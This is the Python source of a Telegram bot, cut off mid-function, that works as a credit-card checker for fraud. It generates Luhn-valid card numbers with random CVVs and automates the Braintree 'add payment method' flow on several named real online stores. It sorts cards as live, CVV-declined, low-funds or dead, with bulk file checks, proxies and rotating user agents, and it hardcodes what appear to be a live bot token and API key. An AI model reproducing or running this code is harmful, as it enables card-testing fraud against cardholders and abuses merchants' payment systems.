import telebot
from telebot import types
import requests
import re
import uuid
import time
from datetime import datetime
import urllib3
import random
import threading
import json
import os
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = '8582065184:AAFsBa11_PyuWZVw_xr4rvoGhIerqiiUHDI'
ADMIN_ID = 5629984144
bot = telebot.TeleBot(BOT_TOKEN)

USERS_FILE = 'users.json'

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('approved_users', [])), data.get('pending_requests', {})
        except:
            return set(), {}
    return set(), {}

def save_users():
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump({'approved_users': list(approved_users), 'pending_requests': pending_requests}, f, indent=4)
    except Exception as e:
        print(f"Error saving users: {e}")

approved_users, pending_requests = load_users()

ACTIVE_PROXY = None
PROXY_LOCK = threading.Lock()

def test_proxy(proxy_url):
    try:
        response = requests.get('https://api.braintreegateway.com', proxies={'http': proxy_url, 'https': proxy_url}, timeout=10, verify=False)
        return response.status_code in [200, 301, 302, 403, 404]
    except:
        return False

def set_proxy(proxy_url):
    global ACTIVE_PROXY
    if test_proxy(proxy_url):
        with PROXY_LOCK:
            ACTIVE_PROXY = proxy_url
        return True, "Proxy is live and set successfully!"
    return False, "Proxy is dead or unreachable"

def remove_proxy():
    global ACTIVE_PROXY
    with PROXY_LOCK:
        ACTIVE_PROXY = None
    return "Proxy removed. Using direct connection."

def get_proxies():
    with PROXY_LOCK:
        return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None

# Default Braintree sites
DEFAULT_BRAINTREE_SITES = [
    "https://bandc.com",
    "https://www.easternmarine.com",
    "https://universal-akb.com",
    "https://store.segway.com",
]

user_sessions = {}
user_cooldowns = {}
stop_checking = {}
user_custom_sites = {}
COOLDOWN_CHECK = 10
COOLDOWN_MASS = 20
MAX_MASS_CARDS = 10
MAX_FILE_CARDS = 500
HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"

def get_card_info(card_number):
    info = {'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🌍', 'bank': 'Unknown', 'level': 'Unknown'}
    bin_number = card_number[:6]
    
    if HANDYAPI_KEY:
        try:
            response = requests.get(f"https://data.handyapi.com/bin/{bin_number}",
                headers={'x-api-key': HANDYAPI_KEY, 'User-Agent': 'Mozilla/5.0'}, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                if data.get('Scheme'): 
                    info['brand'] = str(data['Scheme']).upper()
                if data.get('Type'): 
                    info['type'] = str(data['Type']).title()
                if data.get('Category'): 
                    info['level'] = str(data['Category']).title()
                elif data.get('CardTier'): 
                    info['level'] = str(data['CardTier']).title()
                if data.get('Issuer'): 
                    info['bank'] = str(data['Issuer']).title()
                country_data = data.get('Country')
                if country_data and isinstance(country_data, dict):
                    if country_data.get('Name'): 
                        info['country'] = country_data['Name'].upper()
                    if country_data.get('A2') and len(country_data['A2']) == 2:
                        info['flag'] = ''.join(chr(127397 + ord(c)) for c in country_data['A2'].upper())
                if info['bank'] != 'Unknown' and info['country'] != 'Unknown':
                    return info
        except:
            pass
    
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}",
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            if data.get('scheme'): 
                info['brand'] = data['scheme'].upper()
            if data.get('type'): 
                info['type'] = data['type'].title()
            if data.get('brand'): 
                info['level'] = data['brand'].title()
            if data.get('bank', {}).get('name'): 
                info['bank'] = data['bank']['name'].title()
            if data.get('country', {}).get('name'): 
                info['country'] = data['country']['name'].upper()
            if data.get('country', {}).get('alpha2') and len(data['country']['alpha2']) == 2:
                info['flag'] = ''.join(chr(127397 + ord(c)) for c in data['country']['alpha2'].upper())
    except:
        pass
    
    if card_number[0] == '4': 
        info['brand'], info['type'] = 'VISA', 'Credit'
    elif card_number[:2] in ['51', '52', '53', '54', '55']: 
        info['brand'], info['type'] = 'MASTERCARD', 'Credit'
    elif card_number[:2] in ['34', '37']: 
        info['brand'], info['type'] = 'AMERICAN EXPRESS', 'Credit'
    
    return info

def luhn_check(card_number):
    digits = [int(d) for d in str(card_number)]
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return checksum % 10 == 0

def calculate_luhn_digit(partial_card):
    digits = [int(d) for d in str(partial_card) + '0']
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return (10 - (checksum % 10)) % 10

def generate_cards(bin_number, quantity, exp_month=None, exp_year=None):
    if len(bin_number) < 6:
        return None, "BIN must be at least 6 digits"
    if quantity < 1 or quantity > 20:
        return None, "Quantity must be between 1 and 20"
    
    cards = []
    card_length = 16 if bin_number[0] in ['4', '5'] else 15
    
    for _ in range(quantity):
        partial = bin_number + ''.join([str(random.randint(0, 9)) for _ in range(card_length - len(bin_number) - 1)])
        check_digit = calculate_luhn_digit(partial)
        card_number = partial + str(check_digit)
        
        if exp_month and exp_year:
            month = int(exp_month)
            year = int(exp_year) if len(str(exp_year)) == 2 else int(str(exp_year)[-2:])
        else:
            month = random.randint(1, 12)
            year = random.randint(25, 30)
        
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        cards.append(f"{card_number}|{month:02d}|{year:02d}|{cvv}")
    
    return cards, None

def check_cooldown(chat_id, command_type):
    current_time = time.time()
    cooldown = COOLDOWN_CHECK if command_type == 'check' else COOLDOWN_MASS
    if chat_id not in user_cooldowns: 
        user_cooldowns[chat_id] = {}
    if command_type in user_cooldowns[chat_id]:
        time_passed = current_time - user_cooldowns[chat_id][command_type]
        if time_passed < cooldown:
            return False, int(cooldown - time_passed) + 1
    user_cooldowns[chat_id][command_type] = current_time
    return True, 0

def is_approved(user_id):
    return user_id == ADMIN_ID or user_id in approved_users

def require_approval(func):
    def wrapper(message):
        if not is_approved(message.from_user.id):
            text = "╔════════════════════╗\n"
            text += "║   🚫 ACCESS DENIED   ║\n"
            text += "╚════════════════════╝\n\n"
            text += "⚠️ You need admin approval\n"
            text += "📝 Use /request to get access\n"
            bot.send_message(message.chat.id, text)
            return
        return func(message)
    return wrapper

def generate_user_agent():
    return random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    ])

def get_braintree_site(chat_id):
    if chat_id in user_custom_sites and user_custom_sites[chat_id]:
        return user_custom_sites[chat_id]
    return random.choice(DEFAULT_BRAINTREE_SITES)

class BraintreeChecker:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        self.session = requests.Session()
        self.user_agent = generate_user_agent()
        
    def validate_card(self, card):
        start_time = time.time()
        
        try:
            parts = card.replace(' ', '').split('|')
            if len(parts) != 4:
                return {'status': 'error', 'message': 'Invalid format', 'icon': '❌', 'time': 0}
            
            number, exp_month, exp_year, cvv = parts
            
            if not number.isdigit() or len(number) < 13 or len(number) > 19:
                return {'status': 'error', 'message': 'Invalid card number', 'icon': '❌', 'time': 0}
            
            card_info = get_card_info(number)
            
            if not luhn_check(number):
                return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info, 'time': 0}
            
            if len(exp_year) == 4:
                exp_year = exp_year[-2:]
            
        except Exception as e:
            return {'status': 'error', 'message': f'Parse error: {str(e)}', 'icon': '❌', 'time': 0}
        
        site_url = get_braintree_site(self.chat_id)
        
        try:
            # Step 1: Get add payment method page
            headers = {
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            
            response = self.session.get(f'{site_url}/my-account/add-payment-method/', headers=headers, proxies=get_proxies(), verify=False, timeout=30)
            
            if response.status_code != 200:
                return {'status': 'error', 'message': 'Site unreachable', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
            
            # Extract client token nonce
            client_match = re.search(r'client_token_nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
            if not client_match:
                return {'status': 'error', 'message': 'No Braintree token found', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
            
            client_nonce = client_match.group(1)
            
            # Extract wpnonce
            add_nonce_match = re.search(r'name="_wpnonce" value="([^"]+)"', response.text)
            if not add_nonce_match:
                return {'status': 'error', 'message': 'No wpnonce found', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
            
            add_nonce = add_nonce_match.group(1)
            
            # Step 2: Get Braintree client token
            headers_ajax = {
                'User-Agent': self.user_agent,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
            }
            
            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': client_nonce,
            }
            
            response = self.session.post(f'{site_url}/wp-admin/admin-ajax.php', cookies=self.session.cookies, headers=headers_ajax, data=data, proxies=get_proxies(), verify=False, timeout=30)
            
            try:
                response_json = response.json()
            except:
                return {'status': 'error', 'message': 'Invalid JSON response', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
            
            if 'data' not in response_json:
                return {'status': 'error', 'message': 'Token fetch failed', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
            
            enc = response_json['data']
            dec = base64.b64decode(enc).decode('utf-8')
            au_match = re.search(r'"authorizationFingerprint":"([^"]+)"', dec)
            
            if not au_match:
                return {'status': 'error', 'message': 'Auth fingerprint not found', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
            
            au = au_match.group(1)
            
            # Step 3: Tokenize card with Braintree
            headers_bt = {
                'User-Agent': self.user_agent,
                'Authorization': f'Bearer {au}',
                'Braintree-Version': '2018-05-10',
                'Content-Type': 'application/json',
                'Origin': 'https://assets.braintreegateway.com',
                'Referer': 'https://assets.braintreegateway.com/',
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': str(uuid.uuid4()),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': number,
                            'expirationMonth': exp_month,
                            'expirationYear': exp_year,
                            'cvv': cvv,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = self.session.post('https://payments.braintree-api.com/graphql', headers=headers_bt, json=json_data, proxies=get_proxies(), verify=False, timeout=30)
            
            try:
                bt_json = response.json()
            except:
                return {'status': 'error', 'message': 'Braintree API error', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
            
            if 'data' not in bt_json or not bt_json.get('data', {}).get('tokenizeCreditCard'):
                return {'status': 'error', 'message': 'Tokenization failed', 'icon': '❌', 'card_info': card_info, 'time': round(time.time() - start_time, 2)}
            
            tok = bt_json['data']['tokenizeCreditCard']['token']
            
            # Step 4: Add payment method
            headers_final = {
                'User-Agent': self.user_agent,
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            data = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'master-card',
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': tok,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                '_wpnonce': add_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            
            response = self.session.post(f'{site_url}/my-account/add-payment-method/', cookies=self.session.cookies, headers=headers_final, data=data, proxies=get_proxies(), verify=False, timeout=30)
            
            response_text = response.text.lower()
            elapsed_time = round(time.time() - start_time, 2)
            
            # Check responses
            if 'payment method successfully added' in response_text or 'nice! new payment method added' in response_text:
                return {
                    'status': 'live',
                    'message': 'Payment successful',
                    'icon': '✅',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            # CVV responses
            if 'cvv' in response_text or 'security code' in response_text or 'card issuer declined cvv' in response_text:
                return {
                    'status': 'live_cvv',
                    'message': 'Card Issuer Declined CVV',
                    'icon': '⚠️',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            # Insufficient funds
            if 'insufficient' in response_text or 'insufficient funds' in response_text:
                return {
                    'status': 'insufficient',
                    'message': 'Insufficient Funds',
                    'icon': '💰',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            # Extract status code if present
            status_match = re.search(r'status code\s*(.+?)<\/', response_text)
            if status_match:
                status_msg = status_match.group(1).strip()
                
                if any(word in status_msg.lower() for word in ['approved', 'success', 'authorized']):
                    return {
                        'status': 'live',
                        'message': status_msg,
                        'icon': '✅',
                        'card_info': card_info,
                        'time': elapsed_time
                    }
                elif 'cvv' in status_msg.lower():
                    return {
                        'status': 'live_cvv',
                        'message': status_msg,
                        'icon': '⚠️',
                        'card_info': card_info,
                        'time': elapsed_time
                    }
                elif 'insufficient' in status_msg.lower():
                    return {
                        'status': 'insufficient',
                        'message': status_msg,
                        'icon': '💰',
                        'card_info': card_info,
                        'time': elapsed_time
                    }
                else:
                    return {
                        'status': 'dead',
                        'message': status_msg,
                        'icon': '❌',
                        'card_info': card_info,
                        'time': elapsed_time
                    }
            
            # Dead card responses
            dead_keywords = [
                'declined', 'do not honor', 'expired', 'invalid', 'stolen',
                'lost', 'pickup', 'restricted', 'exceeds', 'not permitted', 'risk'
            ]
            
            for keyword in dead_keywords:
                if keyword in response_text:
                    return {
                        'status': 'dead',
                        'message': f'Card {keyword.title()}',
                        'icon': '❌',
                        'card_info': card_info,
                        'time': elapsed_time
                    }
            
            return {
                'status': 'dead',
                'message': 'Card Declined',
                'icon': '❌',
                'card_info': card_info,
                'time': elapsed_time
            }
            
        except Exception as e:
            elapsed_time = round(time.time() - start_time, 2)
            return {
                'status': 'error',
                'message': f'Error: {str(e)}',
                'icon': '❌',
                'card_info': card_info if 'card_info' in locals() else {},
                'time': elapsed_time
            }

# ============ BOT COMMANDS ============

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not is_approved(user_id):
        text = "╔════════════════════════╗\n"
        text += "║  💳 BRAINTREE CHECKER  ║\n"
        text += "╚════════════════════════╝\n\n"
        text += "⚠️ ACCESS REQUIRED ⚠️\n\n"
        text += "🔒 You need admin approval\n"
        text += "📝 Use /request for access\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━"
    else:
        text = "╔════════════════════════╗\n"
        text += "║  💳 BRAINTREE CHECKER  ║\n"
        text += "╚════════════════════════╝\n\n"
        text += "🎯 MAIN COMMANDS\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        text += "💳 /bchk - Single card check\n"
        text += "📦 /bmass - Multiple cards check\n"
        text += "📁 /bfile - Upload .txt file\n"
        text += "🔍 /bin - BIN lookup\n"
        text += "🎲 /gen - Generate cards\n"
        text += "🌍 /custom_site - Set your site\n"
        text += "🗑️ /remove_site - Remove site\n"
        text += "📍 /site - Check current site\n"
        text += "❓ /help - Show help\n\n"
        
        if user_id == ADMIN_ID:
            text += "⚙️ ADMIN COMMANDS\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "🌐 /proxy - Set proxy\n"
            text += "🚫 /removeproxy - Remove proxy\n"
            text += "📊 /proxystatus - Check status\n"
            text += "👥 /users - List users\n"
            text += "⏳ /pending - Pending requests\n"
            text += "📢 /broadcast - Send message to all\n\n"
        
        text += "✨ Powered by YOSH ✨"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['request'])
def request_access(message):
    user_id = message.from_user.id
    if is_approved(user_id):
        text = "╔════════════════════╗\n"
        text += "║   ✅ APPROVED   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "🎉 You already have access!"
        bot.send_message(message.chat.id, text)
        return
    if user_id in pending_requests:
        text = "╔════════════════════╗\n"
        text += "║   ⏳ PENDING   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "⏱️ Your request is pending\n"
        text += "Please wait for approval..."
        bot.send_message(message.chat.id, text)
        return
    
    username = message.from_user.username or "No username"
    first_name = message.from_user.first_name or "Unknown"
    last_name = message.from_user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    
    pending_requests[user_id] = {
        'username': username, 
        'name': full_name, 
        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_users()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
        types.InlineKeyboardButton("❌ Deny", callback_data=f"deny_{user_id}")
    )
    
    admin_msg = "╔════════════════════════╗\n"
    admin_msg += "║  📥 NEW ACCESS REQUEST  ║\n"
    admin_msg += "╚════════════════════════╝\n\n"
    admin_msg += f"👤 Name: {full_name}\n"
    admin_msg += f"🔗 Username: @{username}\n"
    admin_msg += f"🆔 ID: {user_id}\n"
    admin_msg += f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    admin_msg += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    admin_msg += "Approve this user?"
    
    bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup)
    
    user_msg = "╔════════════════════╗\n"
    user_msg += "║   📤 REQUEST SENT   ║\n"
    user_msg += "╚════════════════════╝\n\n"
    user_msg += "✅ Request sent to admin\n"
    user_msg += "⏳ Please wait for approval..."
    bot.send_message(message.chat.id, user_msg)

@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_') or call.data.startswith('deny_'))
def handle_approval_callback(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Admin only!")
        return
    
    action, user_id = call.data.split('_')
    user_id = int(user_id)
    
    if action == 'approve':
        approved_users.add(user_id)
        pending_requests.pop(user_id, None)
        save_users()
        bot.answer_callback_query(call.id, "✅ User approved!")
        bot.edit_message_text(f"✅ User {user_id} has been APPROVED!", call.message.chat.id, call.message.message_id)
        try:
            approval_msg = "╔════════════════════╗\n"
            approval_msg += "║   🎉 APPROVED!   ║\n"
            approval_msg += "╚════════════════════╝\n\n"
            approval_msg += "✅ Access granted!\n"
            approval_msg += "🚀 Type /start to begin"
            bot.send_message(user_id, approval_msg)
        except:
            pass
    elif action == 'deny':
        pending_requests.pop(user_id, None)
        save_users()
        bot.answer_callback_query(call.id, "❌ User denied!")
        bot.edit_message_text(f"❌ User {user_id} has been DENIED!", call.message.chat.id, call.message.message_id)
        try:
            deny_msg = "╔════════════════════╗\n"
            deny_msg += "║   ❌ DENIED   ║\n"
            deny_msg += "╚════════════════════╝\n\n"
            deny_msg += "🚫 Access denied by admin"
            bot.send_message(user_id, deny_msg)
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_check_'))
def handle_stop_check(call):
    chat_id = int(call.data.split('_')[2])
    if call.from_user.id == chat_id or call.from_user.id == ADMIN_ID:
        stop_checking[chat_id] = True
        bot.answer_callback_query(call.id, "🛑 Stopping check...")

@bot.message_handler(commands=['bchk'])
@require_approval
def braintree_check(message):
    can_proceed, remaining = check_cooldown(message.chat.id, 'check')
    if not can_proceed:
        text = "╔════════════════════╗\n"
        text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += f"⏱️ Wait {remaining} seconds"
        bot.send_message(message.chat.id, text)
        return
    
    command_parts = message.text.split(maxsplit=1)
    
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║  ❌ INVALID FORMAT  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage: /bchk card|mm|yy|cvv"
        bot.send_message(message.chat.id, text)
        return
    
    card_input = command_parts[1].strip()
    status_msg = bot.send_message(message.chat.id, f"⏳ Checking card...\n\n💳 {card_input}")
    
    checker = BraintreeChecker(message.chat.id)
    result = checker.validate_card(card_input)
    card_info = result.get('card_info', {})
    
    # Format response based on status
    if result['status'] == 'live':
        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ success</b>\n"
        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
    elif result['status'] == 'live_cvv':
        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ ccn</b>\n"
        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
    elif result['status'] == 'insufficient':
        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ insuff</b>\n"
        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
    else:
        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ dead</b>\n"
        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
    
    bot.edit_message_text(check_response, message.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['bmass'])
@require_approval
def braintree_mass(message):
    can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
    if not can_proceed:
        text = "╔════════════════════╗\n"
        text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += f"⏱️ Wait {remaining} seconds"
        bot.send_message(message.chat.id, text)
        return
    
    command_parts = message.text.split(maxsplit=1)
    
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║  ❌ INVALID FORMAT  ║\n"
        text += "╚════════════════════╝\n\n"
        text += f"Usage: /bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
        text += f"Max: {MAX_MASS_CARDS} cards"
        bot.send_message(message.chat.id, text)
        return
    
    cards_text = command_parts[1].strip()
    cards = [c.strip() for c in cards_text.split('\n') if c.strip()]
    
    if len(cards) > MAX_MASS_CARDS:
        text = "╔════════════════════╗\n"
        text += "║  ❌ TOO MANY CARDS  ║\n"
        text += "╚════════════════════╝\n\n"
        text += f"Max: {MAX_MASS_CARDS} cards\n"
        text += f"You sent: {len(cards)} cards"
        bot.send_message(message.chat.id, text)
        return
    
    status_msg = bot.send_message(message.chat.id, f"⏳ Checking {len(cards)} cards...")
    
    checker = BraintreeChecker(message.chat.id)
    results = []
    
    for idx, card in enumerate(cards, 1):
        bot.edit_message_text(f"⏳ Checking {idx}/{len(cards)}...\n\n💳 {card}", message.chat.id, status_msg.message_id)
        result = checker.validate_card(card)
        results.append((card, result))
        time.sleep(1)
    
    mass_response = "╔════════════════════════╗\n"
    mass_response += "║  📦 MASS CHECK RESULTS  ║\n"
    mass_response += "╚════════════════════════╝\n\n"
    mass_response += f"✅ Total: {len(results)} cards\n"
    mass_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for card, result in results:
        mass_response += f"{result['icon']} {card}\n"
        mass_response += f"└ {result['message']} ({result['time']}s)\n\n"
    
    mass_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    mass_response += f"👤 By: @{message.from_user.username or 'User'}"
    
    bot.edit_message_text(mass_response, message.chat.id, status_msg.message_id)

@bot.message_handler(commands=['bfile'])
@require_approval
def request_braintree_file(message):
    text = "╔════════════════════╗\n"
    text += "║  📁 UPLOAD FILE  ║\n"
    text += "╚════════════════════╝\n\n"
    text += "📤 Please upload .txt file\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += "📝 Format: card|mm|yy|cvv\n"
    text += "📊 One card per line\n"
    text += f"📈 Max: {MAX_FILE_CARDS} cards"
    bot.send_message(message.chat.id, text)
    user_sessions[message.chat.id] = {'awaiting_file': True}

@bot.message_handler(content_types=['document'])
@require_approval
def handle_braintree_file(message):
    if message.chat.id not in user_sessions or not user_sessions[message.chat.id].get('awaiting_file'):
        bot.send_message(message.chat.id, "❌ Please use /bfile command first")
        return
    
    user_sessions[message.chat.id]['awaiting_file'] = False
    
    if not message.document.file_name.endswith('.txt'):
        text = "╔════════════════════╗\n"
        text += "║  ❌ INVALID FILE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Please upload a .txt file"
        bot.send_message(message.chat.id, text)
        return
    
    can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
    if not can_proceed:
        text = "╔════════════════════╗\n"
        text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += f"⏱️ Wait {remaining} seconds"
        bot.send_message(message.chat.id, text)
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        cards_text = downloaded_file.decode('utf-8')
        cards = [c.strip() for c in cards_text.split('\n') if c.strip()]
        
        if len(cards) > MAX_FILE_CARDS:
            text = "╔════════════════════╗\n"
            text += "║  ❌ TOO MANY CARDS  ║\n"
            text += "╚════════════════════╝\n\n"
            text += f"Max: {MAX_FILE_CARDS} cards\n"
            text += f"Your file: {len(cards)} cards"
            bot.send_message(message.chat.id, text)
            return
        
        if len(cards) == 0:
            text = "╔════════════════════╗\n"
            text += "║  ❌ EMPTY FILE  ║\n"
            text += "╚════════════════════╝\n\n"
            text += "No valid cards found"
            bot.send_message(message.chat.id, text)
            return
        
        stop_checking[message.chat.id] = False
        
        stop_markup = types.InlineKeyboardMarkup()
        stop_markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{message.chat.id}"))
        
        status_msg = bot.send_message(message.chat.id, "⏳ Initializing file check...", reply_markup=stop_markup)
        
        checker = BraintreeChecker(message.chat.id)
        results = []
        cvv_count = 0
        ccn_count = 0
        low_funds_count = 0
        declined_count = 0
        
        for idx, card in enumerate(cards, 1):
            if stop_checking.get(message.chat.id, False):
                break
            
            result = checker.validate_card(card)
            results.append((card, result))
            
            if result['status'] == 'live_cvv':
                cvv_count += 1
            elif result['status'] == 'live':
                ccn_count += 1
            elif result['status'] == 'insufficient':
                low_funds_count += 1
            elif result['status'] == 'dead':
                declined_count += 1
            
            progress_percent = int((idx / len(cards)) * 100)
            bar_length = 20
            filled_length = int(bar_length * idx // len(cards))
            bar = '█' * filled_length + '░' * (bar_length - filled_length)
            
            progress_msg = "╔════════════════════════════╗\n"
            progress_msg += "║   📊 FILE CHECK IN PROGRESS   ║\n"
            progress_msg += "╚════════════════════════════╝\n\n"
            progress_msg += f"🎯 <b>LIVE STATISTICS</b>\n"
            progress_msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            progress_msg += f"<b>✅ CCN Valid:</b> <code>{ccn_count}</code>\n"
            progress_msg += f"<b>⚠️ CVV Match:</b> <code>{cvv_count}</code>\n"
            progress_msg += f"<b>💰 Low Balance:</b> <code>{low_funds_count}</code>\n"
            progress_msg += f"<b>❌ Declined:</b> <code>{declined_count}</code>\n\n"
            progress_msg += f"📈 <b>PROGRESS</b>\n"
